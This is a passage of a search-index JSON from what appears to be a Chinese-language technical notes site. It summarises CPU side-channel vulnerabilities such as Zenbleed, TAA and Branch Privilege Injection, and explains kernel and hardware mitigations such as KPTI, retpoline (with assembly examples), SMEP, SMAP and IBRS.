\u200b\u7f13\u89e3\u200b\u63aa\u65bd\u200b\uff1a - \u200b\u6dfb\u52a0\u200b LFENCE \u200b\u4ee5\u200b\u963b\u6b62\u200b\u63a8\u6d4b\u200b\u6267\u884c\u200b - \u200b\u8bbe\u7f6e\u200b Speculative Store Bypass Disable (SSBD)</p> </li> </ul>"},{"location":"hardware/cpu_vulnerabilities.html#zenbleed","title":"Zenbleed","text":"<ul> <li>Zenbleed</li> <li>\u200b\u539f\u7406\u200b\uff1a<ul> <li>\u200b\u90e8\u5206\u200b AMD \u200b\u5904\u7406\u5668\u200b\u5728\u200b\u5904\u7406\u200b\u5411\u91cf\u200b\u5904\u7406\u5668\u200b\u548c\u200b\u5206\u652f\u200b\u9884\u6d4b\u200b\u9519\u8bef\u200b\u6062\u590d\u200b\u65f6\u6709\u200b BUG\uff0c\u200b\u5bfc\u81f4\u200b\u53ef\u80fd\u200b\u4f1a\u200b\u6cc4\u9732\u200b\u5411\u91cf\u200b\u5bc4\u5b58\u5668\u200b\u7684\u200b\u65e7\u503c\u200b</li> </ul> </li> <li>\u200b\u7f13\u89e3\u200b\u63aa\u65bd\u200b\uff1a<ul> <li>\u200b\u5347\u7ea7\u200b Microcode</li> </ul> </li> </ul>"},{"location":"hardware/cpu_vulnerabilities.html#tsx-asynchronous-abort","title":"TSX Asynchronous Abort","text":"<ul> <li>TAA - TSX Asynchronous Abort</li> <li>Intel\u00ae Transactional Synchronization Extensions (Intel\u00ae TSX) Asynchronous Abort / CVE-2019-11135 / INTEL-SA-00270</li> <li>Intel Transactional Synchronization Extensions (TSX) \u200b\u662f\u200b Intel \u200b\u7684\u200b Transactional Memory \u200b\u7684\u200b\u5b9e\u73b0\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u628a\u200b\u4e00\u7cfb\u5217\u200b\u7684\u200b\u6307\u4ee4\u200b\u5f53\u6210\u200b\u4e00\u4e2a\u200b\u4e8b\u52a1\u200b\u539f\u5b50\u200b\u5730\u200b\u5b8c\u6210\u200b</li> <li>\u200b\u539f\u7406\u200b\uff1a<ul> <li>\u200b\u653b\u51fb\u8005\u200b\u542f\u52a8\u200b\u4e00\u4e2a\u200b TSX Transaction\uff0c\u200b\u5f53\u200b\u5b83\u200b\u88ab\u200b\u5f02\u6b65\u200b\u5730\u200b\u6253\u65ad\u200b\u65f6\u200b\uff0c\u200b\u4e00\u4e9b\u200b\u6307\u4ee4\u200b\u4f1a\u200b\u5728\u200b\u63a8\u6d4b\u200b\u6267\u884c\u200b\u8def\u5f84\u200b\u4e0a\u200b\u8bfb\u53d6\u200b\u5230\u200b\u5904\u7406\u5668\u200b\u5185\u90e8\u7ed3\u6784\u200b\u7684\u200b\u503c\u200b\uff0c\u200b\u8fdb\u800c\u200b\u6cc4\u9732\u200b\u4fe1\u606f\u200b</li> </ul> </li> </ul>"},{"location":"hardware/cpu_vulnerabilities.html#special-register-buffer-data-sampling-srbds","title":"Special Register Buffer Data Sampling (SRBDS)","text":"<ul> <li>SRBDS - Special Register Buffer Data Sampling</li> <li>\u200b\u539f\u7406\u200b\uff1a<ul> <li>RDRAND \u200b\u548c\u200b RDSEED \u200b\u6307\u4ee4\u200b\u7684\u200b\u7ed3\u679c\u200b\u4f1a\u200b\u4fdd\u5b58\u200b\u5728\u200b Special Register Buffer \u200b\u5f53\u4e2d\u200b</li> <li>\u200b\u901a\u8fc7\u200b Microarchitectural Data Sampling (MDS) \u200b\u7684\u200b\u65b9\u6cd5\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u6cc4\u9732\u200b\u51fa\u200b Special Register Buffer \u200b\u7684\u200b\u5185\u5bb9\u200b\uff0c\u200b\u4ece\u800c\u200b\u55c5\u200b\u63a2\u5230\u200b\u968f\u673a\u6570\u200b\u751f\u6210\u200b\u6307\u4ee4\u200b\u7684\u200b\u7ed3\u679c\u200b</li> </ul> </li> </ul>"},{"location":"hardware/cpu_vulnerabilities.html#mmio-stale-data","title":"MMIO Stale Data","text":"<ul> <li>Processor MMIO Stale Data Vulnerabilities</li> <li>\u200b\u539f\u7406\u200b\uff1a<ul> <li>\u200b\u5728\u200b\u865a\u62df\u673a\u200b\u4e2d\u200b\u7684\u200b\u653b\u51fb\u8005\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u5bf9\u5916\u200b\u8bbe\u200b\u8fdb\u884c\u200b MMIO\uff0cMMIO \u200b\u7684\u200b\u4e0d\u5f53\u200b\u5b9e\u73b0\u200b\u53ef\u80fd\u200b\u4f1a\u200b\u6cc4\u9732\u200b\u6838\u4e0a\u200b\u5bbf\u4e3b\u673a\u200b\u6216\u200b\u5176\u4ed6\u200b\u865a\u62df\u673a\u200b\u7684\u200b\u6570\u636e\u200b</li> </ul> </li> </ul>"},{"location":"hardware/cpu_vulnerabilities.html#indirect-target-selection","title":"Indirect Target Selection","text":"<ul> <li>CVE-2024-28956</li> <li>Indirect Target Selection / INTEL-SA-01153</li> <li>Training Solo \u200b\u53d1\u73b0\u200b\u7684\u200b\u5176\u4e2d\u200b\u4e00\u4e2a\u200b\u6f0f\u6d1e\u200b</li> <li>\u200b\u539f\u7406\u200b\uff1a<ul> <li>\u200b\u90e8\u5206\u200b Intel \u200b\u7684\u200b CPU \u200b\u6709\u200b BUG\uff0c\u200b\u4f7f\u5f97\u200b\u5728\u200b\u7f13\u5b58\u200b\u884c\u524d\u200b\u534a\u200b\u90e8\u5206\u200b\uff08\u200b\u6839\u636e\u200b\u5206\u652f\u200b\u7684\u200b\u6700\u540e\u200b\u4e00\u4e2a\u200b\u5b57\u8282\u200b\u7684\u200b\u4f4d\u7f6e\u200b\u5224\u65ad\u200b\uff09\u200b\u7684\u200b\u95f4\u63a5\u200b\u5206\u652f\u200b\uff0c\u200b\u5b83\u200b\u7684\u200b\u76ee\u7684\u200b\u5730\u5740\u200b\u53ef\u4ee5\u200b\u88ab\u200b\u9884\u6d4b\u200b\u4e3a\u200b\u7f13\u5b58\u200b\u884c\u540e\u200b\u534a\u200b\u90e8\u5206\u200b\u7684\u200b\u5206\u652f\u200b\u7684\u200b\u76ee\u7684\u200b\u5730\u5740\u200b</li> </ul> </li> <li>\u200b\u7f13\u89e3\u200b\u63aa\u65bd\u200b\uff1a<ul> <li>\u200b\u5fae\u7801\u200b\u66f4\u65b0\u200b</li> <li>\u200b\u628a\u200b\u95f4\u63a5\u200b\u5206\u652f\u200b\u653e\u5230\u200b\u7f13\u5b58\u200b\u884c\u200b\u7684\u200b\u540e\u200b\u534a\u200b\u90e8\u5206\u200b</li> </ul> </li> </ul>"},{"location":"hardware/cpu_vulnerabilities.html#branch-privilege-injection","title":"Branch Privilege Injection","text":"<ul> <li>CVE-2024-45332</li> <li>Branch Privilege Injection</li> <li>\u200b\u539f\u7406\u200b\uff1a<ul> <li>\u200b\u5206\u652f\u200b\u9884\u6d4b\u5668\u200b\u7684\u200b\u66f4\u65b0\u200b\u662f\u200b\u5f02\u6b65\u200b\u7684\u200b\uff0c\u200b\u4ece\u200b\u4e00\u4e2a\u200b\u5206\u652f\u200b\u7684\u200b\u6b63\u786e\u200b\u7ed3\u679c\u200b\u51fa\u6765\u200b\uff0c\u200b\u5230\u200b\u628a\u200b\u7ed3\u679c\u200b\u7528\u4e8e\u200b\u5206\u652f\u200b\u9884\u6d4b\u5668\u200b\u7684\u200b\u8bad\u7ec3\u200b\uff0c\u200b\u9700\u8981\u200b\u82e5\u5e72\u4e2a\u200b\u5468\u671f\u200b</li> <li>\u200b\u5207\u6362\u200b\u7279\u6743\u200b\u6001\u200b\u6216\u8005\u200b\u8fdb\u884c\u200b IBPB\uff08Indirect Branch Prediction Barrier\uff09\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u5f02\u6b65\u200b\u7684\u200b\u66f4\u65b0\u200b\u4f9d\u7136\u200b\u5728\u200b\u8fdb\u884c\u200b\uff0c\u200b\u5bfc\u81f4\u200b\u6709\u200b\u4e00\u4e9b\u200b\u5206\u652f\u200b\u9884\u6d4b\u5668\u200b\u7684\u200b\u66f4\u65b0\u200b\u4ece\u200b\u4e00\u4e2a\u200b\u7279\u6743\u200b\u6001\u200b\u6cc4\u9732\u200b\u5230\u200b\u4e86\u200b\u53e6\u200b\u4e00\u4e2a\u200b\u7279\u6743\u200b\u6001\u200b</li> </ul> </li> <li>\u200b\u7f13\u89e3\u200b\u63aa\u65bd\u200b\uff1a<ul> <li>\u200b\u5fae\u7801\u200b\u66f4\u65b0\u200b</li> </ul> </li> </ul>"},{"location":"hardware/cpu_vulnerabilities.html#mitigations","title":"\u7f13\u89e3\u200b\u63aa\u65bd\u200b Mitigations","text":""},{"location":"hardware/cpu_vulnerabilities.html#kaslr","title":"KASLR","text":"<ul> <li>KASLR: Kernel Address Space Layout Randomization</li> <li>\u200b\u968f\u673a\u5316\u200b\u5185\u6838\u200b\u5730\u5740\u200b\uff0c\u200b\u907f\u514d\u200b\u653b\u51fb\u8005\u200b\u731c\u6d4b\u51fa\u200b\u5185\u6838\u200b\u5730\u5740\u200b</li> </ul>"},{"location":"hardware/cpu_vulnerabilities.html#kernel-page-table-isolation-kptiptikaiser","title":"Kernel Page Table Isolation (KPTI/PTI/KAISER)","text":"<ul> <li>\u200b\u53c8\u79f0\u200b KAISER\uff1a\u200b\u8bba\u6587\u200b KASLR is Dead: Long Live KASLR</li> <li>Page Table Isolation (PTI)</li> <li>\u200b\u5728\u200b\u7528\u6237\u200b\u6001\u200b\u7684\u200b\u9875\u8868\u200b\u91cc\u200b\uff0c\u200b\u4e0d\u8981\u200b\u6620\u5c04\u200b\u6574\u4e2a\u200b\u5185\u6838\u200b\u6001\u200b\u7a7a\u95f4\u200b\uff0c\u200b\u53ea\u200b\u6620\u5c04\u200b\u5fc5\u987b\u200b\u6620\u5c04\u200b\u7684\u200b\u90e8\u5206\u200b\uff0c\u200b\u8fdb\u5165\u200b\u5185\u6838\u200b\u6001\u540e\u200b\uff0c\u200b\u518d\u200b\u5207\u6362\u200b\u5230\u200b\u5177\u6709\u200b\u5b8c\u6574\u200b\u7684\u200b\u5185\u6838\u200b\u6001\u200b\u5730\u5740\u200b\u7a7a\u95f4\u200b\u7684\u200b\u9875\u8868\u200b</li> <li>\u200b\u7279\u522b\u200b\u5730\u200b\uff0cLinux \u200b\u5b9e\u73b0\u200b KPTI \u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u5728\u200b\u5185\u6838\u200b\u6001\u200b\u4f7f\u7528\u200b\u7684\u200b\u5b8c\u6574\u200b\u7684\u200b\u9875\u8868\u200b\u91cc\u200b\uff0c\u200b\u7528\u6237\u200b\u6001\u200b\u5730\u5740\u200b\u4f1a\u200b\u88ab\u200b\u6807\u8bb0\u200b\u4e3a\u200b NX\uff0c\u200b\u4e5f\u200b\u5c31\u662f\u200b\u4e0d\u80fd\u200b\u6267\u884c\u200b</li> <li>\u200b\u90a3\u4e48\u200b\u5728\u200b\u7528\u6237\u200b\u6001\u200b\u5c1d\u8bd5\u200b\u8bfb\u53d6\u200b\u5185\u6838\u200b\u6001\u200b\u5730\u5740\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u7531\u4e8e\u200b\u5730\u5740\u200b\u4e0d\u200b\u5728\u200b TLB \u200b\u5f53\u4e2d\u200b\uff0c\u200b\u4e5f\u200b\u5c31\u200b\u65e0\u6cd5\u200b\u8bfb\u53d6\u200b\u5185\u5b58\u200b\uff0c\u200b\u4e0d\u4f1a\u200b\u6cc4\u6f0f\u200b\u6570\u636e\u200b</li> <li>\u200b\u4fee\u590d\u200b Meltdown \u200b\u6f0f\u6d1e\u200b</li> </ul>"},{"location":"hardware/cpu_vulnerabilities.html#retpoline","title":"Retpoline","text":"<ul> <li>Retpoline</li> <li>\u200b\u628a\u200b\u95f4\u63a5\u200b\u5206\u652f\u200b\u66ff\u6362\u200b\u4e3a\u200b call/ret \u200b\u5bf9\u200b\uff0c\u200b\u540c\u65f6\u200b\u628a\u200b\u6808\u200b\u4e0a\u200b\u7684\u200b\u5730\u5740\u200b\u6539\u6210\u200b\u5b9e\u9645\u200b\u7684\u200b\u76ee\u7684\u200b\u5730\u5740\u200b\uff0c\u200b\u5f3a\u8feb\u200b\u786c\u4ef6\u200b\u7528\u200b Return Stack Buffer \u200b\u505a\u200b\u9884\u6d4b\u200b\uff0c\u200b\u4f46\u200b\u7531\u4e8e\u200b\u8986\u76d6\u200b\u4e86\u200b\u8fd4\u56de\u200b\u5730\u5740\u200b\uff0cReturn Stack Buffer \u200b\u603b\u662f\u200b\u4f1a\u200b\u9884\u6d4b\u200b\u9519\u8bef\u200b\uff0c\u200b\u5728\u200b\u9519\u8bef\u200b\u8def\u5f84\u200b\u4e0a\u200b\u5faa\u73af\u200b\u6267\u884c\u200b pause-lfence-jmp \u200b\u4e09\u6761\u200b\u6307\u4ee4\u200b\uff0c\u200b\u4e0d\u4f1a\u200b\u88ab\u200b\u653b\u51fb\u8005\u200b\u63a7\u5236\u200b\uff0c\u200b\u4f46\u4f1a\u200b\u635f\u5931\u200b\u6027\u80fd\u200b</li> <li>\u200b\u9488\u5bf9\u200b\u95f4\u63a5\u200b\u8df3\u8f6c\u200b\uff1a     <pre><code># for indirect jmp:\n# before:\njmp *%rax\n\n# after:\ncall load_label # push the address of capture_ret_spec to the stack\n\ncapture_ret_spec:\npause\nlfence\njmp capture_ret_spec\n\nload_label:\nmov %rax, (%rsp) # override the return address on the top of the stack\nret # the return stack buffer predicts to jump to capture_ret_spec\n</code></pre></li> <li>\u200b\u9488\u5bf9\u200b\u95f4\u63a5\u200b\u8c03\u7528\u200b\uff1a     <pre><code># for indirect call:\n# before:\ncall *%rax\n\n# after:\njmp label2\nlabel0:\n    call label1 # push the address of capture_ret_spec to the stack\n\ncapture_ret_spec:\n    pause\n    lfence\n    jmp capture_ret_spec\n\nlabel1:\n    mov %rax, (%rsp) # override the return address\n    ret\n\nlabel2:\n    call label0 # use extra call to maintain real return address\n    # continue execution\n</code></pre></li> <li>\u200b\u4fee\u590d\u200b\u57fa\u4e8e\u200b\u95f4\u63a5\u200b\u5206\u652f\u200b\u7684\u200b\u6f0f\u6d1e\u200b\uff1aSpectre Variant 2 Branch Target Injection</li> </ul>"},{"location":"hardware/cpu_vulnerabilities.html#supervisor-mode-execution-prevention-smep","title":"Supervisor-Mode Execution Prevention (SMEP)","text":"<ul> <li>Supervisor-Mode Execution Prevention (SMEP) \u200b\u5728\u200b\u5185\u6838\u200b\u6001\u4e0b\u200b\uff0c\u200b\u7981\u6b62\u200b\u8fd0\u884c\u200b\uff08\u200b\u5305\u62ec\u200b\u63a8\u6d4b\u200b\u8fd0\u884c\u200b\uff09\u200b\u7528\u6237\u200b\u6001\u200b\u5730\u5740\u200b\u7a7a\u95f4\u200b\u5185\u200b\u7684\u200b\u4ee3\u7801\u200b\uff0c\u200b\u8fd9\u6837\u200b\u5c31\u200b\u7f29\u5c0f\u200b\u4e86\u200b\u653b\u51fb\u8005\u200b\u53ef\u200b\u5229\u7528\u200b\u7684\u200b\u4ee3\u7801\u200b\u8303\u56f4\u200b</li> <li>\u200b\u53c8\u79f0\u200b Intel\u00ae OS Guard</li> <li>SMEP \u200b\u672c\u8eab\u200b\u4e0d\u80fd\u200b\u4fee\u590d\u200b\u6f0f\u6d1e\u200b\uff0c\u200b\u4f46\u200b\u53ef\u4ee5\u200b\u7ed9\u200b\u653b\u51fb\u8005\u200b\u521b\u9020\u200b\u66f4\u200b\u591a\u200b\u9650\u5236\u200b</li> <li>x86 \u200b\u4e0a\u200b\uff0cSMEP \u200b\u5728\u200b CR4 \u200b\u5bc4\u5b58\u5668\u200b\u4e2d\u200b</li> <li>ARMv8 \u200b\u4e0a\u200b\uff0c\u200b\u8fd9\u4e2a\u200b\u529f\u80fd\u200b\u901a\u8fc7\u200b PXN(Privileged eXecute Never) \u200b\u5b9e\u73b0\u200b\uff0c\u200b\u8bb0\u5f55\u200b\u5728\u200b\u9875\u8868\u200b\u4e2d\u200b</li> </ul>"},{"location":"hardware/cpu_vulnerabilities.html#supervisor-mode-access-prevention-smap","title":"Supervisor-Mode Access Prevention (SMAP)","text":"<ul> <li>Supervisor-Mode Access Prevention (SMAP) \u200b\u5728\u200b\u5185\u6838\u200b\u6001\u4e0b\u200b\uff0c\u200b\u7981\u6b62\u200b\u8bbf\u95ee\u200b\uff08\u200b\u5305\u62ec\u200b\u63a8\u6d4b\u200b\u8bbf\u95ee\u200b\uff09\u200b\u7528\u6237\u200b\u6001\u200b\u7a7a\u95f4\u200b\u7684\u200b\u5185\u5b58\u200b\uff0c\u200b\u7f29\u5c0f\u200b\u653b\u51fb\u8005\u200b\u53ef\u4ee5\u200b\u5229\u7528\u200b\u7684\u200b\u5185\u5b58\u200b\u8303\u56f4\u200b\uff1b\u200b\u4ee3\u4ef7\u200b\u662f\u200b\u5728\u200b\u9700\u8981\u200b\u8bbf\u95ee\u200b\u7528\u6237\u200b\u6001\u200b\u7a7a\u95f4\u200b\u7684\u200b\u5185\u5b58\u200b\u65f6\u200b\uff0c\u200b\u5185\u6838\u200b\u9700\u8981\u200b\u4e34\u65f6\u200b\u5173\u95ed\u200b SMAP</li> <li>SMAP \u200b\u76f8\u5f53\u4e8e\u200b\u662f\u200b\u628a\u200b SMEP \u200b\u7684\u200b\u9650\u5236\u200b\u4ece\u200b\u6267\u884c\u200b\u6743\u9650\u200b\u6269\u5c55\u200b\u5230\u200b\u4e86\u200b\u8bfb\u5199\u200b\u6743\u9650\u200b</li> <li>SMAP \u200b\u672c\u8eab\u200b\u4e0d\u80fd\u200b\u4fee\u590d\u200b\u6f0f\u6d1e\u200b\uff0c\u200b\u4f46\u200b\u53ef\u4ee5\u200b\u7ed9\u200b\u653b\u51fb\u8005\u200b\u521b\u9020\u200b\u66f4\u200b\u591a\u200b\u9650\u5236\u200b</li> <li> <p>x86 \u200b\u4e0a\u200b\uff0c\u200b\u9996\u5148\u200b\u5728\u200b CR4 \u200b\u5bc4\u5b58\u5668\u200b\u4e2d\u200b\u542f\u7528\u200b SMAP\uff0c\u200b\u6b64\u65f6\u200b\u9ed8\u8ba4\u200b\u60c5\u51b5\u200b\u4e0b\u200b\u5185\u6838\u200b\u4e0d\u80fd\u200b\u8bbf\u95ee\u200b\u7528\u6237\u200b\u6001\u200b\u7684\u200b\u6570\u636e\u200b\uff0c\u200b\u53ea\u6709\u200b\u5728\u200b <code>stac</code> \u200b\u6307\u4ee4\u200b\u4e4b\u540e\u200b\u4e14\u200b\u5728\u200b <code>clac</code> \u200b\u6307\u4ee4\u200b\u4e4b\u524d\u200b\u7684\u200b\u533a\u95f4\u200b\u5185\u200b\u53ef\u4ee5\u200b\u8bbf\u95ee\u200b\u7528\u6237\u200b\u6001\u200b\u6570\u636e\u200b\uff1a</p> <p><pre><code># cannot access user pointers\nstac\n# can access user pointers\nclac\n# cannot access user pointers\n</code></pre> - ARMv8 \u200b\u4e0a\u200b\uff0c\u200b\u8fd9\u4e2a\u200b\u529f\u80fd\u200b\u901a\u8fc7\u200b PSTATE.PAN(Privileged Acess Never) \u200b\u5b9e\u73b0\u200b - \u200b\u867d\u7136\u200b\u5185\u6838\u200b\u4e0d\u80fd\u200b\u7528\u200b\u7528\u6237\u200b\u6001\u200b\u7684\u200b\u6307\u9488\u200b\u8bbf\u95ee\u200b\u7528\u6237\u200b\u6001\u200b\u7684\u200b\u6570\u636e\u200b\uff0c\u200b\u4f46\u200b\u7531\u4e8e\u200b Linux \u200b\u4e0b\u200b\u6240\u6709\u200b\u7684\u200b\u7269\u7406\u5730\u5740\u200b\u90fd\u200b\u88ab\u200b\u6620\u5c04\u200b\u5230\u200b\u4e86\u200b\u5185\u6838\u200b\u7684\u200b\u5730\u5740\u200b\u7a7a\u95f4\u200b\uff0c\u200b\u6240\u4ee5\u200b\u5982\u679c\u200b\u53ef\u4ee5\u200b\u83b7\u53d6\u200b\u5230\u200b\u7528\u6237\u200b\u6001\u200b\u7684\u200b\u6307\u9488\u200b\u5bf9\u5e94\u200b\u7684\u200b\u7269\u7406\u5730\u5740\u200b\u5728\u200b\u5185\u6838\u200b\u6001\u4e2d\u200b\u88ab\u200b\u6620\u5c04\u200b\u7684\u200b\u5730\u5740\u200b\uff0c\u200b\u4e5f\u200b\u53ef\u4ee5\u200b\u5728\u200b\u5185\u6838\u200b\u6001\u200b\u8bbf\u95ee\u200b\u5b83\u200b</p> </li> </ul>"},{"location":"hardware/cpu_vulnerabilities.html#bounds-clipping","title":"Bounds Clipping","text":"<ul> <li>\u200b\u8fb9\u754c\u200b\u68c0\u67e5\u200b\u5982\u679c\u200b\u7528\u200b\u6761\u4ef6\u200b\u5206\u652f\u200b\u5b9e\u73b0\u200b\uff0c\u200b\u53ef\u80fd\u200b\u4f1a\u200b\u5728\u200b\u5206\u652f\u200b\u9884\u6d4b\u200b\u7684\u200b\u9519\u8bef\u200b\u8def\u5f84\u200b\u4e0a\u200b\u8bbf\u95ee\u200b\u8fb9\u754c\u200b\u5916\u200b\u7684\u200b\u5185\u5b58\u200b</li> <li>Bounds Clipping \u200b\u4ee5\u200b\u6027\u80fd\u200b\u635f\u5931\u200b\u4e3a\u200b\u4ee3\u4ef7\u200b\uff0c\u200b\u628a\u200b\u8fb9\u754c\u200b\u68c0\u67e5\u200b\u7684\u200b\u6761\u4ef6\u200b\u5206\u652f\u200b\u53d8\u6210\u200b\u8ba1\u7b97\u200b\uff0c\u200b\u4ece\u800c\u200b\u907f\u514d\u200b\u4e86\u200b\u9519\u8bef\u200b\u8def\u5f84\u200b\u7684\u200b\u9884\u6d4b\u200b\u6267\u884c\u200b</li> <li>Linux \u200b\u7684\u200b\u5b9e\u73b0\u200b\uff1a <code>array_index_nospec</code> \u200b\u5b8f\u200b</li> <li>\u200b\u4fee\u590d\u200b Spectre Variant 1 \u200b\u5373\u200b Bounds Check Bypass \u200b\u6f0f\u6d1e\u200b</li> </ul>"},{"location":"hardware/cpu_vulnerabilities.html#indirect-branch-restricted-speculation-ibrs","title":"Indirect Branch Restricted Speculation (IBRS)","text":"<ul> <li>Indirect Branch Restricted Speculation (IBRS)</li> <li>AMD64 TECHNOLOGY INDIRECT BRANCH CONTROL EXTENSION</li> <li>\u200b\u4ece\u200b\u7528\u6237\u200b\u6001\u200b\u5207\u6362\u200b\u5230\u200b\u5185\u6838\u200b\u6001\u540e\u200b\uff0c\u200b\u5728\u200b\u5185\u6838\u200b\u6001\u200b\u8bbe\u7f6e\u200b <code>IA32_SPEC_CTRL.IBRS = 1</code> \u200b\u53ef\u4ee5\u200b\u4fdd\u8bc1\u200b\u5185\u6838\u200b\u6001\u200b\u540e\u7eed\u200b\u95f4\u63a5\u200b\u5206\u652f\u200b\u7684\u200b\u9884\u6d4b\u200b\u4e0d\u4f1a\u200b\u88ab\u200b\u7528\u6237\u200b\u6001\u200b\u5f71\u54cd\u200b</li> <li>\u200b\u53ea\u200b\u4fdd\u62a4\u200b\u4e86\u200b\u95f4\u63a5\u200b\u5206\u652f\u200b\u7684\u200b\u9884\u6d4b\u200b\uff0c\u200b\u4e0d\u200b\u4fdd\u62a4\u200b Return Stack Buffer</li> <li>\u200b\u53ea\u200b\u907f\u514d\u200b\u4e86\u200b\u7528\u6237\u200b\u6001\u5bf9\u200b\u5185\u6838\u200b\u6001\u200b\u7684\u200b\u95f4\u63a5\u200b\u9884\u6d4b\u5668\u200b\u7684\u200b\u5f71\u54cd\u200b\uff0c\u200b\u4f46\u200b\u4e0d\u540c\u200b\u7528\u6237\u200b\u6001\u200b\u8fdb\u7a0b\u200b\u95f4\u200b\uff08\u200b\u5305\u62ec\u200b\u865a\u62df\u673a\u200b\u4e4b\u95f4\u200b\uff09\u200b\u8fd8\u662f\u200b\u4f1a\u200b\u4e92\u76f8\u200b\u5f71\u54cd\u200b</li> <li>IBRS \u200b\u5305\u62ec\u200b\u4e86\u200b STIBP \u200b\u7684\u200b\u529f\u80fd\u200b\uff1a\u200b\u5982\u679c\u200b\u5f00\u542f\u200b\u4e86\u200b IBRS\uff0c\u200b\u90a3\u4e48\u200b\u540c\u4e00\u4e2a\u200b\u7269\u7406\u200b\u6838\u200b\u7684\u200b\u4e24\u4e2a\u200b\u903b\u8f91\u200b\u6838\u200b\u4e4b\u95f4\u200b\u7684\u200b\u95f4\u63a5\u200b\u5206\u652f\u200b\u9884\u6d4b\u5668\u200b\u4e5f\u200b\u4f1a\u200b\u88ab\u200b\u9694\u79bb\u200b</li> <li>\u200b\u6b64\u5916\u200b IBRS \u200b\u8fd8\u4f1a\u200b\u4fdd\u8bc1\u200b\u5185\u6838\u200b\u6001\u200b\u548c\u200b Enclave \u200b\u4ee5\u53ca\u200b SMM\uff08System Management Mode\uff09\u200b\u4e4b\u95f4\u200b\u7684\u200b\u9694\u79bb\u200b\uff0c\u200b\u5728\u200b Linux \u200b\u91cc\u200b\u79f0\u200b\u8fd9\u4e2a\u200b\u529f\u80fd\u200b\u4e3a\u200b IBRS_FW\uff0c\u200b\u8868\u793a\u200b\u5bf9\u200b\u56fa\u4ef6\u200b\u7684\u200b\u4fdd\u62a4\u200b</li> <li>\u200b\u4fee\u590d\u200b\u57fa\u4e8e\u200b\u95f4\u63a5\u200b\u5206\u652f\u200b\u7684\u200b\u6f0f\u6d1e\u200b\uff1aSpectre Variant 2 Branch Target Injection</li> </ul>"},{"location":"hardware/cpu_vulnerabilities.html#enhanced-indirect-branch-restricted-speculation-enhanced-ibrseibrs","title":"Enhanced Indirect Branch Restricted Speculation (Enhanced IBRS/eIBRS)","text":"<ul> <li>Indirect Branch Restricted Speculation (IBRS) \u200b\u6bcf\u6b21\u200b\u4ece\u200b\u7528\u6237\u200b\u6001\u200b\u5207\u6362\u200b\u5230\u200b\u5185\u6838\u200b\u6001\u200b\u90fd\u200b\u8981\u200b\u5199\u5165\u200b\u4e00\u6b21\u200b <code>IA32_SPEC_CTRL.IBRS</code>\uff0c\u200b\u964d\u4f4e\u200b\u6027\u80fd\u200b</li> <li>AMD64 TECHNOLOGY INDIRECT BRANCH CONTROL EXTENSION</li> <li>Enhanced IBRS\uff1a\u200b\u6253\u5f00\u200b\u4e00\u6b21\u200b\u4ee5\u540e\u200b\uff0c\u200b\u603b\u662f\u200b\u542f\u7528\u200b IBRS</li> <li>\u200b\u4e0d\u518d\u200b\u9700\u8981\u200b\u6bcf\u6b21\u200b\u4ece\u200b\u7528\u6237\u200b\u6001\u200b\u5207\u6362\u200b\u5230\u200b\u5185\u6838\u200b\u6001\u53bb\u200b\u5199\u5165\u200b <code>IA32_SPEC_CTRL.IBRS</code></li> <li>\u200b\u4fee\u590d\u200b\u57fa\u4e8e\u200b\u95f4\u63a5\u200b\u5206\u652f\u200b\u7684\u200b\u6f0f\u6d1e\u200b\uff1aSpectre Variant 2 Branch Target Injection</li> <li>Post-barrier Return Stack Buffer with eIBRS enabled (PBRSB-eIBRS)\uff1a\u200b\u5373\u4f7f\u200b\u6253\u5f00\u200b\u4e86\u200b eIBRS\uff0c\u200b\u7531\u4e8e\u200b IBRS \u200b\u4e3b\u8981\u200b\u9488\u5bf9\u200b\u7684\u200b\u662f\u200b\u95f4\u63a5\u200b\u5206\u652f\u200b\u9884\u6d4b\u200b\uff0c\u200b\u5bf9\u4e8e\u200b ret \u200b\u7684\u200b\u4fdd\u62a4\u200b\u662f\u200b\u4e0d\u8db3\u200b\u7684\u200b\uff0c\u200b\u6240\u4ee5\u200b\u9700\u8981\u200b\u989d\u5916\u200b\u7684\u200b\u9488\u5bf9\u200b Return Stack Buffer \u200b\u7684\u200b\u9632\u62a4\u200b</li> </ul>"},{"location":"hardware/cpu_vulnerabilities.html#single-threaded-indirect-branch-predictors-stibp","title":"Single Threaded Indirect Branch Predictors (STIBP)","text":"<ul> <li>Single Thread Indirect Branch Predictors</li> <li>AMD64 TECHNOLOGY INDIRECT BRANCH CONTROL EXTENSION</li> <li>SMT \u200b\u573a\u666f\u200b\u4e0b\u200b\uff0c\u200b\u540c\u4e00\u4e2a\u200b\u7269\u7406\u200b\u6838\u200b\u7684\u200b\u4e24\u4e2a\u200b\u903b\u8f91\u200b\u6838\u200b\u5171\u4eab\u200b\u95f4\u63a5\u200b\u5206\u652f\u200b\u9884\u6d4b\u5668\u200b\uff0c\u200b\u56e0\u6b64\u200b\u53ef\u4ee5\u200b\u4ece\u200b\u4e00\u4e2a\u200b\u903b\u8f91\u200b\u6838\u200b\u64cd\u63a7\u200b\u53e6\u200b\u4e00\u4e2a\u200b\u903b\u8f91\u200b\u6838\u200b\u7684\u200b\u95f4\u63a5\u200b\u5206\u652f\u200b\u9884\u6d4b\u5668\u200b</li> <li>STIBP \u200b\u8bbe\u7f6e\u200b\u542f\u7528\u200b\u540e\u200b\uff08<code>IA32_SPEC_CTRL.STIBP = 1</code>\uff09\uff0c\u200b\u4fdd\u8bc1\u200b\u4e86\u200b\u903b\u8f91\u200b\u6838\u200b\u4e4b\u95f4\u200b\u7684\u200b\u95f4\u63a5\u200b\u5206\u652f\u200b\u9884\u6d4b\u5668\u200b\u7684\u200b\u9694\u79bb\u200b</li> <li>\u200b\u4fee\u590d\u200b\u57fa\u4e8e\u200b\u95f4\u63a5\u200b\u5206\u652f\u200b\u7684\u200b\u6f0f\u6d1e\u200b\uff1aSpectre Variant 2 Branch Target Injection</li> </ul>"},{"location":"hardware/cpu_vulnerabilities.html#indirect-branch-prediction-barrier-ibpb","title":"Indirect Branch Prediction Barrier (IBPB)","text":"<ul> <li>Indirect Branch Predictor Barrier</li> <li>AMD64 TECHNOLOGY INDIRECT BRANCH CONTROL EXTENSION</li> <li>IBPB \u200b\u662f\u200b\u4e00\u4e2a\u200b\u9884\u6d4b\u5668\u200b\u7684\u200b 